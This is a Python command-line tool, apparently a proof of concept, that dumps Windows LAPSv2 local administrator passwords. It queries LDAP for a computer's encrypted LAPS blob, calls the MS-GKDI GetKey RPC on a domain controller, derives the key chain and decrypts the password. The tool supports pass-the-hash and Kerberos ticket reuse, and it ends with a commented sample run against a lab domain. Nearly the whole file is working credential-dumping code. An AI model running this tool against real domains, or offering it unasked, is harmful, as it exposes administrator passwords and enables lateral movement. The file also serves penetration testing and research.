#!/usr/bin/env python3
import argparse
import os
import json
import math
import sys
from uuid import UUID
from pyasn1.codec.der import decoder
from pyasn1_modules import rfc5652
from struct import unpack
from cryptography.hazmat.primitives.kdf.concatkdf import ConcatKDFHash
from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, CounterLocation, Mode
from cryptography.hazmat.primitives import keywrap, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from ldap3 import Server, Connection, NTLM
from impacket.ldap.ldap import LDAPConnection

from impacket.dcerpc.v5 import epm
from impacket.structure import Structure
from impacket.dcerpc.v5 import transport
from impacket.ldap.ldaptypes import ACE, ACL, ACCESS_ALLOWED_ACE, ACCESS_MASK, SR_SECURITY_DESCRIPTOR, LDAP_SID
from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRUniConformantArray
from impacket.dcerpc.v5.dtypes import ULONG, PGUID, LONG, NTSTATUS, NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, DCERPCException
from impacket.uuid import uuidtup_to_bin
from impacket import system_errors

# ==== MS-GKDI implementation

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'GKDI SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'GKDI SessionError: unknown error code: 0x%x' % self.error_code

class BYTE_ARRAY(NDRUniConformantArray):
    item = 'c'

class PBYTE_ARRAY(NDRPOINTER):
    referent = (
        ('Data', BYTE_ARRAY),
    )

class GkdiRpcGetKey(NDRCALL):
    opnum = 0
    structure = (
        ('cbTargetSD', ULONG),
        ('pbTargetSD', BYTE_ARRAY),
        ('pRootKeyID', PGUID),
        ('L0KeyID', LONG),
        ('L1KeyID', LONG),
        ('L2KeyID', LONG),
    )

class GkdiRpcGetKeyResponse(NDRCALL):
    opnum = 0
    structure = (
        ('pcbOut', ULONG),
        ('pbbOut', PBYTE_ARRAY),
        ('ErrorCode', NTSTATUS),
    )

OPNUMS = {
    0   : (GkdiRpcGetKey, GkdiRpcGetKeyResponse),
}

def GkdiGetKey(dce, target_sd, l0 =-1, l1=-1, l2=-1, root_key_id=NULL):
    request = GkdiRpcGetKey()
    request['cbTargetSD'] = len(target_sd)
    request['pbTargetSD'] = target_sd.getData()
    request['pRootKeyID'] = root_key_id
    request['L0KeyID'] = l0
    request['L1KeyID'] = l1
    request['L2KeyID'] = l2
    return dce.request(request)

# ==== Impacket hept_map reimplementation (fix EpTower)

MSRPC_UUID_PORTMAP = uuidtup_to_bin(('E1AF8308-5D1F-11C9-91A4-08002B14A0FA', '3.0'))

def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')), protocol = 'ncacn_np', dce=None):

    if dce is None:
        stringBinding = r'ncacn_ip_tcp:%s[135]' % destHost
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        disconnect = True
    else:
        disconnect = False


    dce.bind(MSRPC_UUID_PORTMAP)

    tower = epm.EPMTower()
    interface = epm.EPMRPCInterface()

    interface['InterfaceUUID'] = remoteIf[:16]
    interface['MajorVersion'] = unpack('<H', remoteIf[16:][:2])[0]
    interface['MinorVersion'] = unpack('<H', remoteIf[18:])[0]

    dataRep = epm.EPMRPCDataRepresentation()
    dataRep['DataRepUuid'] = dataRepresentation[:16]
    dataRep['MajorVersion'] = unpack('<H', dataRepresentation[16:][:2])[0]
    dataRep['MinorVersion'] = unpack('<H', dataRepresentation[18:])[0]

    protId = epm.EPMProtocolIdentifier()
    protId['ProtIdentifier'] = epm.FLOOR_RPCV5_IDENTIFIER

    if protocol == 'ncacn_np':
        pipeName = epm.EPMPipeName()
        pipeName['PipeName'] = b'\x00'

        hostName = epm.EPMHostName()
        hostName['HostName'] = b'%s\x00' % destHost
        transportData = pipeName.getData() + hostName.getData()

    elif protocol == 'ncacn_ip_tcp':
        portAddr = epm.EPMPortAddr()
        portAddr['IpPort'] = 135

        hostAddr = epm.EPMHostAddr()
        import socket
        hostAddr['Ip4addr'] = socket.inet_aton('0.0.0.0')
        transportData = portAddr.getData() + hostAddr.getData()
    elif protocol == 'ncacn_http':
        portAddr = epm.EPMPortAddr()
        portAddr['PortIdentifier'] = epm.FLOOR_HTTP_IDENTIFIER
        portAddr['IpPort'] = 0

        hostAddr = epm.EPMHostAddr()
        import socket
        hostAddr['Ip4addr'] = socket.inet_aton('0.0.0.0')
        transportData = portAddr.getData() + hostAddr.getData()

    else:
        print('%s not support for hetp_map()' % protocol)
        if disconnect is True:
            dce.disconnect()
        return None

    tower['NumberOfFloors'] = 5
    tower['Floors'] = interface.getData() + dataRep.getData() + protId.getData() + transportData

    request = epm.ept_map()
    request['max_towers'] = 4
    request['map_tower']['tower_length'] = len(tower)
    request['map_tower']['tower_octet_string'] = tower.getData()

    # Under Windows 2003 the Referent IDs cannot be random
    # they must have the following specific values
    # otherwise we get a rpc_x_bad_stub_data exception
    request.fields['obj'].fields['ReferentID'] = 1
    request.fields['map_tower'].fields['ReferentID'] = 2

    resp = dce.request(request)

    tower = epm.EPMTower(b''.join(resp['ITowers'][0]['Data']['tower_octet_string']))
    # Now let's parse the result and return an stringBinding
    result = None
    if protocol == 'ncacn_np':
        # Pipe Name should be the 4th floor
        pipeName = epm.EPMPipeName(tower['Floors'][3].getData())
        result = 'ncacn_np:%s[%s]' % (destHost, pipeName['PipeName'].decode('utf-8')[:-1])
    elif protocol == 'ncacn_ip_tcp':
        # Port Number should be the 4th floor
        portAddr = epm.EPMPortAddr(tower['Floors'][3].getData())
        result = 'ncacn_ip_tcp:%s[%s]' % (destHost, portAddr['IpPort'])
    elif protocol == 'ncacn_http':
        # Port Number should be the 4th floor
        portAddr = epm.EPMPortAddr(tower['Floors'][3].getData())
        result = 'ncacn_http:%s[%s]' % (destHost, portAddr['IpPort'])
    if disconnect is True:
        dce.disconnect()
    return result

# ==== STRUCTS

class FFCDHParameter(Structure):
    structure = (
        ('Length', '<L=0'),
        ('Magic', '<4s=0'),
        ('KeyLength', '<L=0'),
        ('_FieldOrder','_-FieldOrder', 'self["KeyLength"]'),
        ('FieldOrder',':'),
        ('_Generator','_-Generator', 'self["KeyLength"]'),
        ('Generator',':')
    )

    def dump(self):
        print("[FFCDH PARAMETER]")
        print("Length:\t\t%s" % (self['Length']))
        print("Magic:\t\t%s" % (self['Magic']))
        print("KeyLength:\t\t%s" % (self['KeyLength']))
        print("FieldOrder:\t\t%s" % (self['FieldOrder']))
        print("Generator:\t\t%s" % (self['Generator']))
        print()

class FFCDHKey(Structure):
    structure = (
        ('Magic', '<4s=0'),
        ('KeyLength', '<L=0'),
        ('_FieldOrder','_-FieldOrder', 'self["KeyLength"]'),
        ('FieldOrder',':'),
        ('_Generator','_-Generator', 'self["KeyLength"]'),
        ('Generator',':'),
        ('_PubKey','_-PubKey', 'self["KeyLength"]'),
        ('PubKey',':'),
    )

    def dump(self):
        print("[FFCDH KEY]")
        print("KeyLength:\t\t%s" % (self['KeyLength']))
        print("FieldOrder:\t\t%s" % (self['FieldOrder']))
        print("Generator:\t\t%s" % (self['Generator']))
        print("PubKey:\t\t%s" % (self['PubKey']))
        print()

class ECDHKey(Structure):
    structure = (
        ('Magic', '<4s=0'),
        ('KeyLength', '<L=0'),
        ('_XCoordinate','_-XCoordinate', 'self["KeyLength"]'),
        ('XCoordinate',':'),
        ('_YCoordinate','_-YCoordinate', 'self["KeyLength"]'),
        ('YCoordinate',':'),
    )

    def dump(self):
        print("[ECDH KEY]")
        print("Magic:\t\t%s" % (hex(self['Magic'])))
        print("XCoordinate:\t\t%s" % (self['XCoordinate']))
        print("YCoordinate:\t\t%s" % (self['YCoordinate']))
        print()

class KDFParameter(Structure):
    structure = (
        ('Unknown1','<L=0'),
        ('Unknown2','<L=0'),
        ('HashLen','<L=0'),
        ('Unknown3','<L=0'),
        ('_HashName','_-HashName', 'self["HashLen"]'),
        ('HashName',':')
    )

class EncryptedPasswordBlob(Structure):
    structure = (
        ('Timestamp_lower', '<L=0'),
        ('Timestamp_upper', '<L=0'),
        ('Length', '<L=0'),
        ('Flags', '<L=0'),
        ('_Blob','_-Blob', 'self["Length"]'),
        ('Blob',':')
    )

    def dump(self):
        print("[ENCRYPTED PASSWORD BLOB]")
        print("Timestamp_upper:\t\t%s" % (self['Timestamp_upper']))
        print("Timestamp_lower:\t\t%s" % (self['Timestamp_lower']))
        print("Update Timestamp:\t\t%s" % ((int(self['Timestamp_upper']) << 32) | self['Timestamp_lower']))
        print("Length:\t\t%s" % (self['Length']))
        print("Flags:\t\t%s" % (self['Flags']))
        print("Blob:\t\t%s" % (self['Blob']))
        print()

class GroupKeyEnvelope(Structure):
    structure = (
        ('Version', '<L=0'),
        ('Magic', '<L=0'),
        ('Flags', '<L=0'),
        ('L0Index', '<L=0'),
        ('L1Index', '<L=0'),
        ('L2Index', '<L=0'),
        ('RootKeyId', '16s=b'),
        ('KdfAlgoLength', '<L=0'),
        ('KdfParaLength', '<L=0'),
        ('SecAlgoLength', '<L=0'),
        ('SecParaLength', '<L=0'),
        ('PrivKeyLength', '<L=0'),
        ('PubKeyLength', '<L=0'),
        ('L1KeyLength', '<L=0'),
        ('L2KeyLength', '<L=0'),
        ('DomainLength', '<L=0'),
        ('ForestLength', '<L=0'),
        ('_KdfAlgo','_-KdfAlgo', 'self["KdfAlgoLength"]'),
        ('KdfAlgo',':'),
        ('_KdfPara','_-KdfPara', 'self["KdfParaLength"]'),
        ('KdfPara',':', KDFParameter),
        ('_SecAlgo','_-SecAlgo', 'self["SecAlgoLength"]'),
        ('SecAlgo',':'),
        ('_SecPara','_-SecPara', 'self["SecParaLength"]'),
        ('SecPara',':', FFCDHParameter),
        ('_Domain','_-Domain', 'self["DomainLength"]'),
        ('Domain',':'),
        ('_Forest','_-Forest', 'self["ForestLength"]'),
        ('Forest',':'),
        ('_L1Key','_-L1Key', 'self["L1KeyLength"]'),
        ('L1Key',':'),
        ('_L2Key','_-L2Key', 'self["L2KeyLength"]'),
        ('L2Key',':'),
    )

    def dump(self):
        print("[GROUP KEY ENVELOPE]")
        print("Version:\t\t%s" % (self['Version']))
        print("Magic:\t\t%s" % (hex(self['Magic'])))
        print("Flags:\t\t%s" % (self['Flags']))
        print("L0Index:\t\t%s" % (self['L0Index']))
        print("L1Index:\t\t%s" % (self['L1Index']))
        print("L2Index:\t\t%s" % (self['L2Index']))
        print("RootKeyId:\t\t%s" % (self['RootKeyId']))
        print("KdfAlgo:\t\t%s" % (self['KdfAlgo'].decode('utf-16le')))
        print("KdfPara:\t\t%s" % (self['KdfPara']['HashName'].decode('utf-16le')))
        print("SecAlgo:\t\t%s" % (self['SecAlgo'].decode('utf-16le')))
        print("SecPara[FieldOrder]:\t%s" % (self['SecPara']['FieldOrder']))
        print("SecPara[Generator]:\t%s" % (self['SecPara']['Generator']))
        print("PrivKeyLength:\t\t%s" % (self['PrivKeyLength']))
        print("PubKeyLength:\t\t%s" % (self['PubKeyLength']))
        print("Domain:\t\t%s" % (self['Domain'].decode('utf-16le')))
        print("Forest:\t\t%s" % (self['Forest'].decode('utf-16le')))
        print("L1Key:\t\t%s" % (self['L1Key']))
        print("L2Key:\t\t%s" % (self['L2Key']))
        print()

class KeyIdentifier(Structure):
    structure = (
        ('Version', '<L=0'),
        ('Magic', '<L=0'),
        ('Flags', '<L=0'),
        ('L0Index', '<L=0'),
        ('L1Index', '<L=0'),
        ('L2Index', '<L=0'),
        ('RootKeyId', '16s=b'),
        ('UnknownLength', '<L=0'),
        ('DomainLength', '<L=0'),
        ('ForestLength', '<L=0'),
        ('_Unknown','_-Unknown', 'self["UnknownLength"]'),
        ('Unknown',':'),
        ('_Domain','_-Domain', 'self["DomainLength"]'),
        ('Domain',':'),
        ('_Forest','_-Forest', 'self["ForestLength"]'),
        ('Forest',':'),
    )

    def dump(self):
        print("[KEY IDENTIFIER]")
        print("Version:\t\t%s" % (self['Version']))
        print("Magic:\t\t%s" % (hex(self['Magic'])))
        print("Flags:\t\t%s" % (self['Flags']))
        print("L0Index:\t\t%s" % (self['L0Index']))
        print("L1Index:\t\t%s" % (self['L1Index']))
        print("L2Index:\t\t%s" % (self['L2Index']))
        print("RootKeyId:\t\t%s" % (self['RootKeyId']))
        print("Unknown:\t\t%s" % (self['Unknown']))
        print("Domain:\t\t%s" % (self['Domain'].decode('utf-16le')))
        print("Forest:\t\t%s" % (self['Forest'].decode('utf-16le')))
        print()

    def is_public_key(self) -> bool:
        return bool(self['Flags'] & 1)

# ==== CORE
# From https://github.com/jborean93/dpapi-ng

KDS_SERVICE_LABEL = "KDS service\0".encode("utf-16-le")

def progress(number, phase, message):
    print('[%d/3] %s: %s' % (number, phase, message), file=sys.stderr)

def error(message):
    print('[!] %s' % message, file=sys.stderr)

def print_laps_result(target, result, as_json=False):
    if as_json or not isinstance(result, dict):
        print(json.dumps(result, indent=2, ensure_ascii=False) if as_json and isinstance(result, dict) else result)
        return

    rows = [('Computer', target)]
    if result.get('n') is not None:
        rows.append(('Local account', str(result['n'])))
    if result.get('p') is not None:
        rows.append(('Password', str(result['p'])))

    if len(rows) == 1:
        print(json.dumps(result, indent=2, ensure_ascii=False))
        return

    label_width = max(len(label) for label, _ in rows)
    print()
    for label, value in rows:
        print('%s : %s' % (label.ljust(label_width), value))

def ldap_request(ldap_server, domain, username, password, base_dn, target_computer,
                 doKerberos=False, lmhash='', nthash='', dcHost=None):
    data = None
    if not base_dn:
        domain_labels = [label for label in domain.strip('.').split('.') if label]
        if not domain_labels:
            raise ValueError('A domain or -base-dn is required to search LDAP')
        base_dn = ','.join('DC=' + label for label in domain_labels)

    computer_name = target_computer.rstrip('$')
    search_filter = '(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=' + computer_name + '))'
    attributes = ['msLAPS-EncryptedPassword', 'msLAPS-Password', 'sAMAccountName']

    if doKerberos:
        # A hostname is required for the LDAP SPN. Prefer the explicit DC host,
        # then reverse DNS, and finally the supplied domain name.
        ldap_host = dcHost or ldap_server
        ldap_ip = ldap_server
        try:
            import ipaddress
            ipaddress.ip_address(ldap_host)
            try:
                import socket
                ldap_host = socket.gethostbyaddr(ldap_host)[0]
            except (OSError, socket.herror):
                ldap_host = domain
        except ValueError:
            pass

        ldap_connection = LDAPConnection('ldap://%s' % ldap_host, baseDN=base_dn,
                                         dstIp=ldap_ip if ldap_ip != ldap_host else None)
        try:
            # With supplied credentials, obtain Kerberos tickets directly.
            # With -no-pass, load the existing ticket cache (KRB5CCNAME).
            use_cache = not password and not lmhash and not nthash
            ldap_connection.kerberosLogin(username, password, domain, lmhash, nthash,
                                          kdcHost=dcHost or ldap_server, useCache=use_cache)
            results = ldap_connection.search(searchBase=base_dn, searchFilter=search_filter,
                                             attributes=attributes)
            for result in results:
                for attribute in result['attributes']:
                    if str(attribute['type']).lower() == 'mslaps-encryptedpassword':
                        values = attribute['vals']
                        if len(values):
                            data = values[0].asOctets()
                            break
                if data is not None:
                    break
        finally:
            ldap_connection.close()
        return data

    ldap_server = Server("ldap://%s" % ldap_server)
    ntlm_password = password
    if lmhash or nthash:
        # ldap3 accepts NTLM hashes in the password field as LMHASH:NTHASH.
        # Use the standard empty LM hash when only an NT hash was supplied.
        ntlm_password = '%s:%s' % (lmhash or 'aad3b435b51404eeaad3b435b51404ee', nthash)
    with Connection(ldap_server, user="%s\\%s" % (domain, username), password=ntlm_password, authentication=NTLM, auto_bind=True) as ldap_connection:
        search_result = ldap_connection.search(search_filter=search_filter, search_base=base_dn, attributes=attributes)
        if search_result:
            results = ldap_connection.response
            data = results[0]['raw_attributes']['msLAPS-EncryptedPassword'][0]
    return data

def connect(username, password, domain, lmhash, nthash, doKerberos, dcHost, dcIp=None):
    MSRPC_UUID_GKDI = uuidtup_to_bin(('B9785960-524F-11DF-8B6D-83DCDED72085','1.0'))
    stringBinding = hept_map(destHost=dcIp or dcHost, remoteIf=MSRPC_UUID_GKDI, protocol = 'ncacn_ip_tcp')

    rpcHost = dcHost
    if doKerberos and rpcHost:
        try:
            import ipaddress
            ipaddress.ip_address(rpcHost)
        except ValueError:
            if '.' not in rpcHost and '.' in domain:
                rpcHost = '%s.%s' % (rpcHost, domain)

    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
    if doKerberos:
        rpctransport.set_kerberos(doKerberos, kdcHost=dcIp or dcHost)
        rpctransport.setRemoteName(rpcHost)
    if dcIp or dcHost:
        # Keep the hostname as the RPC Kerberos SPN name while connecting to
        # the supplied IP address when one is available.
        rpctransport.setRemoteHost(dcIp or dcHost)
    dce = rpctransport.get_dce_rpc()
    if doKerberos:
        # set_kerberos() configures the transport, but DCE/RPC otherwise keeps
        # its default NTLM auth type. Select SPNEGO/Kerberos on the RPC client.
        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    try:
        dce.connect()
    except Exception as e:
        error('Could not connect to the MS-GKDI endpoint: %s' % e)
        return None
    cache_name = None
    direct_kerberos = doKerberos and (password or lmhash or nthash)
    if direct_kerberos:
        import os
        # Impacket's RPC Kerberos helper automatically prefers KRB5CCNAME.
        # Explicit password/hash mode should use the supplied credentials.
        cache_name = os.environ.pop('KRB5CCNAME', None)
    try:
        dce.bind(MSRPC_UUID_GKDI)
    except Exception as e:
        error('MS-GKDI authentication failed: %s' % e)
        return None
    finally:
        if cache_name is not None:
            import os
            os.environ['KRB5CCNAME'] = cache_name
    return dce

def create_ace(sid, mask):
    nace = ACE()
    nace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ACCESS_MASK()
    acedata['Mask']['Mask'] = mask
    acedata['Sid'] = LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace

def create_sd(sid):
    sd = SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = LDAP_SID()
    sd['OwnerSid'].fromCanonical('S-1-5-18')
    sd['GroupSid'] = LDAP_SID()
    sd['GroupSid'].fromCanonical('S-1-5-18')
    sd['Sacl'] = b''

    acl = ACL()
    acl['AclRevision'] = 2
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    acl.aces.append(create_ace(sid, 3))
    acl.aces.append(create_ace('S-1-1-0',2))
    sd['Dacl'] = acl

    return sd

def compute_kdf_context(key_guid, l0, l1, l2):
    return b"".join(
            [
                key_guid,
                l0.to_bytes(4, byteorder="little", signed=True),
                l1.to_bytes(4, byteorder="little", signed=True),
                l2.to_bytes(4, byteorder="little", signed=True),
            ]
        )

def kdf(HashAlg, secret, label, context, length):
    hash_alg = hashes.SHA512()
    if 'SHA512' in HashAlg:
        hash_alg = hashes.SHA512()
    elif 'SHA256' in HashAlg:
        hash_alg = hashes.SHA256()

    kdf = KBKDFHMAC(
        algorithm=hash_alg,
        mode=Mode.CounterMode,
        length=length,
        label=label,
        context=context,
        # MS-SMB2 uses the same KDF function and my implementation that
        # sets a value of 4 seems to work so assume that's the case here.
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        fixed=None,
    )
    return kdf.derive(secret)

def compute_l2_key(key_id: KeyIdentifier, gke: GroupKeyEnvelope):
    l1 = gke["L1Index"]
    l1_key = gke["L1Key"]
    l2 = gke["L2Index"]
    l2_key = gke["L2Key"]

    reseed_l2 = l2 == 31 or l1 != key_id["L1Index"]

    kdf_param = gke["KdfPara"]["HashName"].decode('utf-16le')

    if l2 != 31 and l1 != key_id["L1Index"]:
        l1 -= 1

    while l1 != key_id["L1Index"]:
        reseed_l2 = True
        l1 -= 1

        l1_key = kdf(
            kdf_param,
            l1_key,
            KDS_SERVICE_LABEL,
            compute_kdf_context(
                gke["RootKeyId"],
                gke["L0Index"],
                l1,
                -1
            ),
            64
        )

    if reseed_l2:
        l2 = 31
        l2_key = kdf(
            kdf_param,
            l1_key,
            KDS_SERVICE_LABEL,
            compute_kdf_context(
                gke["RootKeyId"],
                gke["L0Index"],
                l1,
                l2,
            ),
            64,
        )

    while l2 != key_id["L2Index"]:
        l2 -= 1

        l2_key = kdf(
            kdf_param,
            l2_key,
            KDS_SERVICE_LABEL,
            compute_kdf_context(
                gke["RootKeyId"],
                gke["L0Index"],
                l1,
                l2,
            ),
            64,
        )

    return l2_key

def little_to_big(data):
    return data[::-1]

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Dump LAPSv2")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NTLM hashes for pass-the-hash (LM hash may be empty)')

    parser.add_argument('-no-pass', action="store_true", help='Do not prompt for a password; with -k, use the KRB5CCNAME ticket cache')
    parser.add_argument('-k', action="store_true", help='Use Kerberos with a password or hashes; -no-pass uses the KRB5CCNAME ticket cache')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-dc-host', action="store", metavar="hostname", help='Domain controller hostname used for Kerberos service principal names')
    parser.add_argument('-target-computer', action="store", default='', help='Computer that you want the laps admin password')
    parser.add_argument('-base-dn', action="store", default='', help='Base DN')
    parser.add_argument('-debug', action="store_true", help='Show internal structures and key material for troubleshooting')
    parser.add_argument('--json', action="store_true", help='Print the decrypted LAPS record as JSON')


    options = parser.parse_args()
    if options.json and options.debug:
        parser.error('--json cannot be combined with -debug')

    if options.hashes is not None:
        if ':' not in options.hashes:
            parser.error('-hashes must be in LMHASH:NTHASH format; use :NTHASH when the LM hash is empty')
        lmhash, nthash = options.hashes.split(':', 1)
        if not nthash or len(nthash) != 32 or any(c not in '0123456789abcdefABCDEF' for c in nthash):
            parser.error('NTHASH must be 32 hexadecimal characters')
        if lmhash and (len(lmhash) != 32 or any(c not in '0123456789abcdefABCDEF' for c in lmhash)):
            parser.error('LMHASH must be empty or 32 hexadecimal characters')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    # 1. Get the blob from LDAP
    progress(1, 'LDAP', 'Querying msLAPS for %s' % options.target_computer)
    data = ldap_request(options.dc_ip, options.domain, options.username, options.password, options.base_dn, options.target_computer, options.k, lmhash, nthash, options.dc_host)
    if data == None:
        error('No encrypted LAPS blob was found for the target computer')
        return

    # 2. Unpack the encrypted blob to get KeyIdentifier and all the infos
    if options.debug:
        print('[-] Unpacking blob')
    rawblob = EncryptedPasswordBlob(data)
    parsed_cms_data, remaining = decoder.decode(rawblob['Blob'], asn1Spec=rfc5652.ContentInfo())
    enveloped_data_blob = parsed_cms_data['content']
    parsed_enveloped_data, _ = decoder.decode(enveloped_data_blob, asn1Spec=rfc5652.EnvelopedData())

    recipient_infos = parsed_enveloped_data['recipientInfos']
    kek_recipient_info = recipient_infos[0]['kekri']
    kek_identifier = kek_recipient_info['kekid']
    key_id = KeyIdentifier(bytes(kek_identifier['keyIdentifier']))
    tmp,_ = decoder.decode(kek_identifier['other']['keyAttr'])
    sid = tmp['field-1'][0][0][1].asOctets().decode("utf-8")
    target_sd = create_sd(sid)
    if options.debug:
        key_id.dump()

    # 3. Connect on RPC over TCP to MS-GKDI to call opnum 0 GetKey
    progress(2, 'MS-GKDI', 'Requesting decryption keys from the domain controller')
    dce = connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, doKerberos=options.k, dcHost=options.dc_host or options.dc_ip, dcIp=options.dc_ip)
    if dce is None:
        return
    if options.debug:
        print("[-] Calling MS-GKDI GetKey")
    resp = GkdiGetKey(dce, target_sd=target_sd, l0=key_id['L0Index'], l1=key_id['L1Index'], l2=key_id['L2Index'], root_key_id=key_id['RootKeyId'])

    # 4. Unpack GroupKeyEnvelope
    gke = GroupKeyEnvelope(b''.join(resp['pbbOut']))
    if options.debug:
        gke.dump()

    # 5. Compute KEK
    progress(3, 'Decryption', 'Deriving keys and decrypting the LAPS record')
    if options.debug:
        print('[-] Computing L2 Key')
    l2_key = compute_l2_key(key_id, gke)

    kek_secret = None
    kek_context = None

    if key_id.is_public_key():
        if options.debug:
            print('[-] Computing Private Key')
        private_key = kdf(
            gke["KdfPara"]["HashName"].decode('utf-16le'),
            l2_key,
            KDS_SERVICE_LABEL,
            gke['SecAlgo'],
            math.ceil(gke["PrivKeyLength"] / 8),
        )
        if gke['SecAlgo'].decode('utf-16le').encode() == b"DH\0":
            ffcdh_key = FFCDHKey(key_id["Unknown"])
            if options.debug:
                print('[-] Computing Shared Secret based on Diffie-Helmann')
            shared_secret_int = pow(
                int.from_bytes(ffcdh_key['PubKey'], byteorder="big"),
                int.from_bytes(private_key, byteorder="big"),
                int.from_bytes(ffcdh_key['FieldOrder'], byteorder="big"),
            )
            shared_secret = shared_secret_int.to_bytes((shared_secret_int.bit_length() + 7) // 8, byteorder="big")

        kek_context = "KDS public key\0".encode("utf-16le")
        otherinfo = "SHA512\0".encode("utf-16le") + kek_context + KDS_SERVICE_LABEL
        kek_secret = ConcatKDFHash(hashes.SHA256(), length=32, otherinfo=otherinfo).derive(shared_secret)

    else:
        kek_secret = l2_key
        kek_context = key_id["Unknown"]

    if options.debug:
        print('[-] Computing KEK')
    kek = kdf(
        gke["KdfPara"]["HashName"].decode('utf-16le'),
        kek_secret,
        KDS_SERVICE_LABEL,
        kek_context,
        32
    )
    if options.debug:
        print('KEK: %s' % kek)

    # 6. Unwrap CEK
    if options.debug:
        print('[-] Unwraping CEK')
    cek = keywrap.aes_key_unwrap(kek, bytes(kek_recipient_info['encryptedKey']))
    if options.debug:
        print('CEK: %s' % cek)

    enc_content_parameter = bytes(parsed_enveloped_data["encryptedContentInfo"]["contentEncryptionAlgorithm"]["parameters"])
    iv, _ = decoder.decode(enc_content_parameter)
    if options.debug:
        print('[-] Got IV')
    if options.debug:
        print('IV: %s' % bytes(iv[0]))

    # 7. Decrypt the encrypted content with CEK
    cipher = AESGCM(cek)
    output = cipher.decrypt(bytes(iv[0]), remaining, None)
    plaintext = output.decode('utf-16le').rstrip('\x00')
    try:
        parsed_output = json.loads(plaintext)
    except json.JSONDecodeError:
        parsed_output = plaintext
    print_laps_result(options.target_computer, parsed_output, options.json)

if __name__ == "__main__":
    main()

# python3 poc.py -u administrator -p 'Waza1234' -d testlab.local -dc-ip 192.168.56.30 -target-computer 'srv02' -base-dn "dc=testlab,dc=local"
# [-] Connecting to ldap://192.168.56.30:389 - cleartext with user testlab.local\administrator
# [+] Connected! Getting msLAPS-EncryptedPassword for srv02
# [-] Unpacking blob
# [KEY IDENTIFIER]
# Version:		1
# Magic:		0x4b53444b
# Flags:		3
# L0Index:		361
# L1Index:		15
# L2Index:		30
# RootKeyId:		b'\xc5>\x1b\xb7\x84W\x1cx\xa2X\x06=\xc9T\xafN'
